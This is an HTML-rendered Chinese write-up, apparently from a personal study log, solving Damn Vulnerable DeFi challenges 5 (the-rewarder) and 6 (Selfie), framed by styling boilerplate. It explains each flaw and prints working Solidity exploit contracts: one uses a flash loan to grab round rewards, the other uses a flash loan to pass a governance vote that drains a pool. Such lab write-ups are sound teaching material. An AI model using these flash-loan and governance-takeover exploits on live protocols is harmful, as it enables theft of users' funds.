@@ -1,0 +1,531 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Damn5-6.md</title>
+<meta http-equiv="Content-type" content="text/html;charset=UTF-8">
+
+<style>
+/* https://github.com/microsoft/vscode/blob/master/extensions/markdown-language-features/media/markdown.css */
+/*---------------------------------------------------------------------------------------------
+ *  Copyright (c) Microsoft Corporation. All rights reserved.
+ *  Licensed under the MIT License. See License.txt in the project root for license information.
+ *--------------------------------------------------------------------------------------------*/
+
+body {
+	font-family: var(--vscode-markdown-font-family, -apple-system, BlinkMacSystemFont, "Segoe WPC", "Segoe UI", "Ubuntu", "Droid Sans", sans-serif);
+	font-size: var(--vscode-markdown-font-size, 14px);
+	padding: 0 26px;
+	line-height: var(--vscode-markdown-line-height, 22px);
+	word-wrap: break-word;
+}
+
+#code-csp-warning {
+	position: fixed;
+	top: 0;
+	right: 0;
+	color: white;
+	margin: 16px;
+	text-align: center;
+	font-size: 12px;
+	font-family: sans-serif;
+	background-color:#444444;
+	cursor: pointer;
+	padding: 6px;
+	box-shadow: 1px 1px 1px rgba(0,0,0,.25);
+}
+
+#code-csp-warning:hover {
+	text-decoration: none;
+	background-color:#007acc;
+	box-shadow: 2px 2px 2px rgba(0,0,0,.25);
+}
+
+body.scrollBeyondLastLine {
+	margin-bottom: calc(100vh - 22px);
+}
+
+body.showEditorSelection .code-line {
+	position: relative;
+}
+
+body.showEditorSelection .code-active-line:before,
+body.showEditorSelection .code-line:hover:before {
+	content: "";
+	display: block;
+	position: absolute;
+	top: 0;
+	left: -12px;
+	height: 100%;
+}
+
+body.showEditorSelection li.code-active-line:before,
+body.showEditorSelection li.code-line:hover:before {
+	left: -30px;
+}
+
+.vscode-light.showEditorSelection .code-active-line:before {
+	border-left: 3px solid rgba(0, 0, 0, 0.15);
+}
+
+.vscode-light.showEditorSelection .code-line:hover:before {
+	border-left: 3px solid rgba(0, 0, 0, 0.40);
+}
+
+.vscode-light.showEditorSelection .code-line .code-line:hover:before {
+	border-left: none;
+}
+
+.vscode-dark.showEditorSelection .code-active-line:before {
+	border-left: 3px solid rgba(255, 255, 255, 0.4);
+}
+
+.vscode-dark.showEditorSelection .code-line:hover:before {
+	border-left: 3px solid rgba(255, 255, 255, 0.60);
+}
+
+.vscode-dark.showEditorSelection .code-line .code-line:hover:before {
+	border-left: none;
+}
+
+.vscode-high-contrast.showEditorSelection .code-active-line:before {
+	border-left: 3px solid rgba(255, 160, 0, 0.7);
+}
+
+.vscode-high-contrast.showEditorSelection .code-line:hover:before {
+	border-left: 3px solid rgba(255, 160, 0, 1);
+}
+
+.vscode-high-contrast.showEditorSelection .code-line .code-line:hover:before {
+	border-left: none;
+}
+
+img {
+	max-width: 100%;
+	max-height: 100%;
+}
+
+a {
+	text-decoration: none;
+}
+
+a:hover {
+	text-decoration: underline;
+}
+
+a:focus,
+input:focus,
+select:focus,
+textarea:focus {
+	outline: 1px solid -webkit-focus-ring-color;
+	outline-offset: -1px;
+}
+
+hr {
+	border: 0;
+	height: 2px;
+	border-bottom: 2px solid;
+}
+
+h1 {
+	padding-bottom: 0.3em;
+	line-height: 1.2;
+	border-bottom-width: 1px;
+	border-bottom-style: solid;
+}
+
+h1, h2, h3 {
+	font-weight: normal;
+}
+
+table {
+	border-collapse: collapse;
+}
+
+table > thead > tr > th {
+	text-align: left;
+	border-bottom: 1px solid;
+}
+
+table > thead > tr > th,
+table > thead > tr > td,
+table > tbody > tr > th,
+table > tbody > tr > td {
+	padding: 5px 10px;
+}
+
+table > tbody > tr + tr > td {
+	border-top: 1px solid;
+}
+
+blockquote {
+	margin: 0 7px 0 5px;
+	padding: 0 16px 0 10px;
+	border-left-width: 5px;
+	border-left-style: solid;
+}
+
+code {
+	font-family: Menlo, Monaco, Consolas, "Droid Sans Mono", "Courier New", monospace, "Droid Sans Fallback";
+	font-size: 1em;
+	line-height: 1.357em;
+}
+
+body.wordWrap pre {
+	white-space: pre-wrap;
+}
+
+pre:not(.hljs),
+pre.hljs code > div {
+	padding: 16px;
+	border-radius: 3px;
+	overflow: auto;
+}
+
+pre code {
+	color: var(--vscode-editor-foreground);
+	tab-size: 4;
+}
+
+/** Theming */
+
+.vscode-light pre {
+	background-color: rgba(220, 220, 220, 0.4);
+}
+
+.vscode-dark pre {
+	background-color: rgba(10, 10, 10, 0.4);
+}
+
+.vscode-high-contrast pre {
+	background-color: rgb(0, 0, 0);
+}
+
+.vscode-high-contrast h1 {
+	border-color: rgb(0, 0, 0);
+}
+
+.vscode-light table > thead > tr > th {
+	border-color: rgba(0, 0, 0, 0.69);
+}
+
+.vscode-dark table > thead > tr > th {
+	border-color: rgba(255, 255, 255, 0.69);
+}
+
+.vscode-light h1,
+.vscode-light hr,
+.vscode-light table > tbody > tr + tr > td {
+	border-color: rgba(0, 0, 0, 0.18);
+}
+
+.vscode-dark h1,
+.vscode-dark hr,
+.vscode-dark table > tbody > tr + tr > td {
+	border-color: rgba(255, 255, 255, 0.18);
+}
+
+</style>
+
+<style>
+/* Tomorrow Theme */
+/* http://jmblog.github.com/color-themes-for-google-code-highlightjs */
+/* Original theme - https://github.com/chriskempson/tomorrow-theme */
+
+/* Tomorrow Comment */
+.hljs-comment,
+.hljs-quote {
+	color: #8e908c;
+}
+
+/* Tomorrow Red */
+.hljs-variable,
+.hljs-template-variable,
+.hljs-tag,
+.hljs-name,
+.hljs-selector-id,
+.hljs-selector-class,
+.hljs-regexp,
+.hljs-deletion {
+	color: #c82829;
+}
+
+/* Tomorrow Orange */
+.hljs-number,
+.hljs-built_in,
+.hljs-builtin-name,
+.hljs-literal,
+.hljs-type,
+.hljs-params,
+.hljs-meta,
+.hljs-link {
+	color: #f5871f;
+}
+
+/* Tomorrow Yellow */
+.hljs-attribute {
+	color: #eab700;
+}
+
+/* Tomorrow Green */
+.hljs-string,
+.hljs-symbol,
+.hljs-bullet,
+.hljs-addition {
+	color: #718c00;
+}
+
+/* Tomorrow Blue */
+.hljs-title,
+.hljs-section {
+	color: #4271ae;
+}
+
+/* Tomorrow Purple */
+.hljs-keyword,
+.hljs-selector-tag {
+	color: #8959a8;
+}
+
+.hljs {
+	display: block;
+	overflow-x: auto;
+	color: #4d4d4c;
+	padding: 0.5em;
+}
+
+.hljs-emphasis {
+	font-style: italic;
+}
+
+.hljs-strong {
+	font-weight: bold;
+}
+</style>
+
+<style>
+/*
+ * Markdown PDF CSS
+ */
+
+ body {
+	font-family: -apple-system, BlinkMacSystemFont, "Segoe WPC", "Segoe UI", "Ubuntu", "Droid Sans", sans-serif, "Meiryo";
+	padding: 0 12px;
+}
+
+pre {
+	background-color: #f8f8f8;
+	border: 1px solid #cccccc;
+	border-radius: 3px;
+	overflow-x: auto;
+	white-space: pre-wrap;
+	overflow-wrap: break-word;
+}
+
+pre:not(.hljs) {
+	padding: 23px;
+	line-height: 19px;
+}
+
+blockquote {
+	background: rgba(127, 127, 127, 0.1);
+	border-color: rgba(0, 122, 204, 0.5);
+}
+
+.emoji {
+	height: 1.4em;
+}
+
+code {
+	font-size: 14px;
+	line-height: 19px;
+}
+
+/* for inline code */
+:not(pre):not(.hljs) > code {
+	color: #C9AE75; /* Change the old color so it seems less like an error */
+	font-size: inherit;
+}
+
+/* Page Break : use <div class="page"/> to insert page break
+-------------------------------------------------------- */
+.page {
+	page-break-after: always;
+}
+
+</style>
+
+<script src="https://unpkg.com/mermaid/dist/mermaid.min.js"></script>
+</head>
+<body>
+  <script>
+    mermaid.initialize({
+      startOnLoad: true,
+      theme: document.body.classList.contains('vscode-dark') || document.body.classList.contains('vscode-high-contrast')
+          ? 'dark'
+          : 'default'
+    });
+  </script>
+<h1 id="damn-defi%E9%9D%B6%E5%9C%BA%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%955-6">Damn Defi靶场刷题记录(5-6)</h1>
+<pre><code>author: Thomas_Xu
+</code></pre>
+<h2 id="5-the-rewarder">5 the-rewarder</h2>
+<p>FlashPool从一开始就获得一百万个代币，提到的4个人中的每一个人都获得100个DVT，这些DVT立即由他们存入奖励池。在此初始设置之后，时间提前5天，并支付一轮奖励：每人25个奖励代币。
+这道题有四个合约，是第一道多合约的题目。不过不用害怕，我们一个一个来分析。</p>
+<ul>
+<li><strong>RewardToken</strong>
+这是一个简单的ERC20的Token，没有什么问题。唯一的区别就是这个奖励币可以被无限铸造。</li>
+<li><strong>AccountingToken</strong>
+这是一个有访问控制管理的具有交易快照功能的Token，应该是针对每一轮的奖励而写的Token。不过看上去也没有问题。</li>
+<li><strong>FlashLoanerPool</strong>
+这是比较常见的闪电贷池，让我们来具体看看它是怎么实现的。</li>
+</ul>
+<pre class="hljs"><code><div>function flashLoan(uint256 amount) external nonReentrant {
+        uint256 balanceBefore = liquidityToken.balanceOf(address(this));
+        require(amount &lt;= balanceBefore, &quot;Not enough token balance&quot;);
+
+        require(msg.sender.isContract(), &quot;Borrower must be a deployed contract&quot;);
+        
+        liquidityToken.transfer(msg.sender, amount);
+
+        msg.sender.functionCall(
+            abi.encodeWithSignature(
+                &quot;receiveFlashLoan(uint256)&quot;,
+                amount
+            )
+        );
+
+        require(liquidityToken.balanceOf(address(this)) &gt;= balanceBefore, &quot;Flash loan not paid back&quot;);
+    }
+</div></code></pre>
+<p>明显的，出现了外部调用，这应该立马引起我们的警觉，这意味着我们可能利用<code>receiveFlashLoan()</code>函数干一些坏事。</p>
+<ul>
+<li><strong>TheRewarderPool</strong>
+这应该是这个系统最核心的合约了，里面有存款，奖励，取款的一系列流程。</li>
+</ul>
+<blockquote>
+<p>存款会触发奖励分配功能。 首先检查是否经过了足够的时间来开始新一轮，如果是，它将创建快照。无论哪种方式，它都会根据他与所有其他用户的存款金额来计算呼叫者的奖励。然后，它检查调用方是否已经检索到当前回合的奖励，如果没有，则铸造计算出的奖励代币数量。</p>
+</blockquote>
+<p>在了解了工作原理之后，我注意到了这个问题：如果你的时间安排得当，并用你的存款开始新一轮，<strong>你可以立即领取该轮的奖励并退出</strong>。从另一份合同中完成所有这些操作，这意味着在一次交易中，您可以使用闪回符并索取大部分奖励。</p>
+<ul>
+<li><strong>Exploit</strong>
+闪电贷函数有一个外部调用可以被我们利用，而奖励池里我们只需要存款进去，就可以立即获取奖励并退出。</li>
+</ul>
+<blockquote>
+<p>那么我们就可以从闪电贷池里jiu借钱存到奖励池里，领取奖励后取款，最后把钱还给借贷池就大功告成了。</p>
+</blockquote>
+<p>来看代码</p>
+<pre class="hljs"><code><div>
+pragma solidity ^0.8.0;
+
+import &quot;./FlashLoanerPool.sol&quot;;
+import &quot;./TheRewarderPool.sol&quot;;
+import &quot;../DamnValuableToken.sol&quot;;
+
+contract RewarderExploit{
+
+    FlashLoanerPool loanpool;
+    TheRewarderPool rewardpool;
+    RewardToken public immutable rewardToken;
+    DamnValuableToken public immutable liquidityToken;
+    address attacker;
+
+    constructor(address _loanpool, address _rewardpool, address _tokenAddress, address _rewardToken){
+        loanpool = FlashLoanerPool(_loanpool);
+        rewardpool = TheRewarderPool(_rewardpool);
+        liquidityToken = DamnValuableToken(_tokenAddress);
+        rewardToken = RewardToken(_rewardToken);
+        attacker = msg.sender;
+    }
+
+    function attack(uint256 _amount) public {
+        loanpool.flashLoan(_amount);
+    }
+
+    function receiveFlashLoan(uint256 _amount) payable external{
+        liquidityToken.approve(address(rewardpool), _amount);
+        rewardpool.deposit(_amount);
+        uint256 rewards = rewardpool.distributeRewards();
+        rewardToken.transfer(attacker, rewards);
+        rewardpool.withdraw(_amount);
+        liquidityToken.transfer(address(loanpool), _amount);
+    }
+}
+</div></code></pre>
+<ul>
+<li>总结
+这应该是所有希望激励用户存款的系统都会面临的漏洞（暂且叫闪借攻击吧），即使您为了防止来自闪借攻击，强制将回合开始（快照）放在与流动性存款不同的交易，拥有大量代币的用户仍然可以在一轮结束时存入它们，并在新一轮开始后立即提款。你的协议可能希望激励长期质押，而不是短期套利交易。
+因此，最好是摆脱回合，根据存款的每一秒来计算奖励，就像今天许多现代DeFi项目所做的那样。</li>
+</ul>
+<h2 id="6-selfie">6 Selfie</h2>
+<p>这个题和以往的题唯一不同的地方，就是多了一个治理机制。但同时，这个治理机制如果不安全，反而会适得其反。</p>
+<ul>
+<li>
+<p><strong>SelfiePool</strong>
+这个池里有一个闪电贷的函数，同时有一个特殊的可以转出所有资金的函数<code>drainAllFunds()</code>。值得注意的是这个函数有一个修饰符<code>onlyGovernance</code>也就是只能被治理合约所调用，看起来非常安全，但其实我们一旦获得治理合约的控制权，我们就可以榨干<code>SelfiePool</code>.</p>
+</li>
+<li>
+<p><strong>SimpleGovernance</strong>
+这就是之前提到的治理合约，显而易见的是我们需要在这里面找到漏洞干一些坏事。让我们来看看吧。
+这个合约比较复杂，我们简单说一说</p>
+<ul>
+<li>queueAction
+<blockquote>
+<p>通过这个函数我们可以把data放进队列，而为了成功排队，我们必须拥有总供应量的一半以上，而由于我们现在有闪借池，这点很容易绕过。
+我们无法立即执行操作，因为有2天的延迟，我们必须先等待。但是，我们在这里所要做的就是将时间快进2天，因为没有什么可以确保我们在延迟期间仍然持有这些治理令牌</p>
+</blockquote>
+</li>
+<li>executeAction
+这个函数使用来执行的，按照队列id一个交易一个交易的执行，但是这个函数明显是有借入风险的，我们只需要把作为参数传入的address改为我们想借入的合约地址，然后在排队的时候修改<code>data</code>的内容，很容易做到这一点。这样，我们就可以冒充治理合约来调用<code>drainAllFunds()</code>了。</li>
+</ul>
+</li>
+<li>
+<p><strong>Exploit</strong>
+根据以上分析写出Exploit如下：</p>
+</li>
+</ul>
+<pre class="hljs"><code><div>pragma solidity ^0.8.0;
+
+import &quot;./SimpleGovernance.sol&quot;;
+import &quot;./SelfiePool.sol&quot;;
+import &quot;../DamnValuableTokenSnapshot.sol&quot;;
+
+contract SelfieExploit {
+
+    SimpleGovernance public goverance;
+    SelfiePool public pool;
+    address attcker;
+    uint256 actionId;
+    constructor(address _pool, address _goverance){
+        pool = SelfiePool(_pool);
+        goverance = SimpleGovernance(_goverance);
+        attcker = msg.sender;
+    }
+
+    function exploit (uint256 _amount) public {
+        pool.flashLoan(_amount);
+    }
+
+    function receiveTokens (address _token, uint256 amount) external {
+        DamnValuableTokenSnapshot token = DamnValuableTokenSnapshot(_token);
+        token.snapshot();
+        actionId = goverance.queueAction(address(pool),
+            abi.encodeWithSignature(
+                &quot;drainAllFunds(address)&quot;,
+                attcker
+            ),
+            0); 
+        token.transfer(address(pool), amount);
+    }
+
+    function drainToAttacker() external {
+        goverance.executeAction(actionId);
+    }
+
+    receive () external payable {}
+}
+
+</div></code></pre>
+<p>总结：治理合约越复杂，越可能出现漏洞，一定谨慎。</p>
+
+</body>
+</html>
